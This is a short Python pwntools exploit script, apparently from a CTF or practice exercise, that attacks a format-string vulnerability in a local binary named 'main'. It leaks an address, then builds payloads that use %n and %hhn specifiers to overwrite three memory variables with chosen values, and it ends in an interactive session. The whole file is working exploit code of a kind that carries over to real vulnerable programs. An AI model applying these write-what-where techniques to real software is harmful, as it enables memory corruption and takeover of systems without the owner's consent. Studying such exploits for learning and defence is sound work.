#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

p = process('./main')

# 0x804a024 <a>:	0x0000007b
# 0x804a028 <b>:	0x000001c8
a_addr = 0x804a024
b_addr = 0x804a028

c_addr = int(p.recvuntil('\n')[2:], 16)
info('c_addr = ' + hex(c_addr))

#gdb.attach(p, 'b main')

def overflow_c():
	payload = p32(c_addr) + '%12c' + '%6$n'
	p.sendline(payload)

#overflow_c()

def overflow_a():
	payload = 'AA' + '%8$n' + 'AA' + p32(a_addr)
	p.sendline(payload)

#overflow_a()

def overflow_b():
	payload = ''
	for i in range(4):
		payload += p32(b_addr + i)
	val = 0x12345678
	prev = len(payload) & 0xFF
	for i in range(4):
		b = (val >> (8 * i)) & 0xFF
		b = (b - prev + 0x100) % 0x100
		if b > 0:
			payload += '%{}c'.format(b)
		payload += '%{}$hhn'.format(6 + i)
		prev += b
	p.sendline(payload)

overflow_b()

p.interactive()

